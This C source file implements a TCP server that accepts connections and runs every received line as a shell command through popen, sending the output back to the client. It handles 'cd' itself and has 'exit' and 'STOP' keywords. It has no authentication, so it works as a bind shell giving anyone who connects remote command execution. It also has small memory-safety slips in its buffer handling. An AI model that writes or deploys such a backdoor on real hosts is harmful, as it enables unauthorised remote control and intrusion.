#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h> // accept()
#include <unistd.h> // write(), read(), ...
#include "../lib/easysocket.h"
#define MAX 4096 // 4kb buffer
#define EOC "€$§"

// execute given command
// return 0: failure, 1: success
static int
execute(char* cmd, size_t len, int connfd) {
    if(strncmp(cmd, "cd", 2) == 0 && strlen(cmd) >= 4) {
        char *path = cmd+3; // skip ['c', 'd',' ']
        if(chdir(path)!=0) return 0;
        size_t l = snprintf(cmd, MAX, "changed dir with success\n");
        write(connfd, cmd, l);
        return 1;
    }

    printf("[+] gonna execute: '%s'\n", cmd);
    FILE* fp = popen(cmd, "r");
    if (!fp) {
        return 0;
    }

    int c;
    size_t counter = 0;
    char buff[MAX] = {0};
    while((c = fgetc(fp))!=EOF) {
        buff[counter++] = c;
        if(counter == MAX) {
            write(connfd, buff, counter);
            counter = 0;
        }
    }

    // if remains
    if(counter > 0) {
        write(connfd, buff, counter);
    }

    return !pclose(fp);
}

// Function designed for chat between client and server.
// return 0: no shut, 1: shutdown
static int
handle(int connfd) {
    char buff[MAX] = {0};
    size_t bytes;

    for (;;) {
        bytes = read(connfd, buff, sizeof(buff));
        if(bytes == 0) {
            printf("client left the conn\n");
            close(connfd);
            return 0;
        }

        if (strncmp("exit", buff, 4) == 0) {
            printf("client left the conn\n");
            close(connfd);
            return 0;
        }

        if (strncmp("STOP", buff, 4) == 0) {
            printf("client left the conn\n");
            close(connfd);
            return 1;
        }

        buff[bytes] = 0;
        if(!execute(buff, bytes, connfd)) {
            char error[] = "error when running command\n";
            write(connfd, error, sizeof(error));
        }
        // send end of command
        write(connfd, EOC, sizeof(EOC));
    }
    return 0;
}

extern int
main(int argc, char **argv){
    if(argc != 3) {
        printf("Usage: %s [ip] [port]\n", argv[0]);
        return 1;
    }

    const char* ip = argv[1];
    const int port = atoi(argv[2]);

    int servfd = listenAddr(ip, port);
    if(servfd == -1) {
        perror("");
        exit(1);
    }

    int connfd;
    struct sockaddr cli = {0};
    socklen_t len = sizeof(cli);
    while((connfd = accept(servfd, (struct sockaddr*)&cli, &len))) {
        if (connfd < 0) {
            perror("");
            continue;
        }
        printf("got a client !\n");

        if(handle(connfd)){break;}
    }
    close(servfd);
}
